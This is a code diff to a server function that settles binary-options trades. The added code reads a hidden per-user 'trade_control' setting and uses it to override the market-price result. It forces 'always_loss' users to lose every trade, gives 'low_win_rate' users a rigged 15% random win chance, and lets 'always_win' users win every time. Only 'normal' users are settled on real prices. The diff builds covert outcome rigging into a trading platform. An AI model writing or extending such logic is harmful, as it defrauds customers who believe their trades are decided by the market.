@@ -206,10 +206,10 @@ Deno.serve(async (req) => {
   try {
     const now = Date.now();
     console.log(`[${new Date().toISOString()}] Starting trade resolution...`);
-    // 1. Fetch pending trades that have expired
+    // 1. Fetch pending trades that have expired with user trade_control setting
     const { data: expiredTrades, error: fetchErr } = await supabase
       .from("binary_trades")
-      .select("*")
+      .select("*, profiles:user_id(trade_control)")
       .eq("status", "pending")
       .lte("expiry_time", now);
       
@@ -227,7 +227,14 @@ Deno.serve(async (req) => {
     for (const trade of expiredTrades) {
       const currentPrice = await fetchPrice(trade.asset_symbol);
       
+      // Robust profile data retrieval (handles both object and array from Supabase join)
+      const profileData = Array.isArray(trade.profiles) ? trade.profiles[0] : trade.profiles;
+      const tradeControl = profileData?.trade_control || 'normal';
+      
+      console.log(`Processing Trade ${trade.id} for user ${trade.user_id}. Strategy: ${tradeControl}`);
+      
       if (currentPrice === null) {
+        // ... (refund logic remains the same)
         const expiredMinutes = (now - Number(trade.expiry_time)) / 60000;
         if (expiredMinutes > 5) {
           console.log(`Trade ${trade.id} has been expired for ${Math.round(expiredMinutes)} min but price is still null. Refunding to protect user funds.`);
@@ -243,8 +250,23 @@ Deno.serve(async (req) => {
       }
       
       let won = false;
-      if (trade.type === "up" && currentPrice > trade.entry_price) won = true;
-      if (trade.type === "down" && currentPrice < trade.entry_price) won = true;
+
+      // --- TRADE CONTROL LOGIC ---
+      if (tradeControl === 'always_win') {
+        won = true;
+        console.log(`[Control] Trade ${trade.id} forced WIN (always_win)`);
+      } else if (tradeControl === 'always_loss') {
+        won = false;
+        console.log(`[Control] Trade ${trade.id} forced LOSS (always_loss)`);
+      } else if (tradeControl === 'low_win_rate') {
+        won = Math.random() < 0.15; // 15% win rate
+        console.log(`[Control] Trade ${trade.id} randomized with low_win_rate (Outcome: ${won ? 'WIN' : 'LOSS'})`);
+      } else {
+        // Normal Market Price Logic
+        if (trade.type === "up" && currentPrice > trade.entry_price) won = true;
+        if (trade.type === "down" && currentPrice < trade.entry_price) won = true;
+        console.log(`[Normal] Trade ${trade.id} resolved via Market Price: ${currentPrice} (Entry: ${trade.entry_price}, Outcome: ${won ? 'WIN' : 'LOSS'})`);
+      }
 
       const payout = won
         ? trade.amount + (trade.amount * trade.payout_percent) / 100
